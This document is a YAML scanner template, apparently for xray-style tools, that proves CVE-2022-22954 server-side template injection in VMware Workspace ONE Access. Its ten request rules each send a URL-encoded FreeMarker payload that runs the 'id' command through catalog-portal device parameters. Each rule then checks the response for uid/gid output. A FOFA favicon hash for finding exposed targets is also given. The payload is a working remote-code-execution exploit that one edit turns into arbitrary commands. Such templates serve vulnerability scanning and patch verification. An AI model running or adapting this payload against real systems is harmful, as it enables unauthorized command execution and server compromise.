name: poc-yaml-vmware-workspace-one-access-cve-2022-22954-ssti
manual: true
transport: http
rules:
  check0:
    request:
      cache: true
      method: GET
      path: "/SAAS/auth/login"
    expression: response.status == 200 && response.body_string.contains("Workspace ONE Access")
  s0:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s1:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui?code=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s2:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui?code=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s3:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/hub-ui?deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s4:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/hub-ui?deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s5:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/hub-ui/byob?deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s6:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/hub-ui/byob?deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s7:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui/oauth/verify?error=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s8:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui/oauth/verify?code=&deviceType=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
  s9:
    request:
      cache: true
      method: GET
      headers:
        Host: "localhost"
      path: "/catalog-portal/ui/oauth/verify?code=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d"
    expression: response.status == 400 && response.raw.bcontains(b"uid") && response.raw.bcontains(b"gid") && response.raw.bcontains(b"group") && (response.raw.bcontains(b"Authorization context is not valid") || response.raw.bcontains(b"Cannot run program") || response.raw.bcontains(b"FreeMarker template error") || response.raw.bcontains(b"auth.context.invalid") || response.raw.bcontains(b"授权上下文无效"))
expression: check0() && (s0() || s1() || s2() || s3() || s4() || s5() || s6() || s7() || s8() || s9())
detail:
  author: ascar
  links:
    - https://github.com/bewhale/CVE-2022-22954
  fofakeyword: http.favicon.hash="-1250474341"
  vulninfo: CVE-2022-22954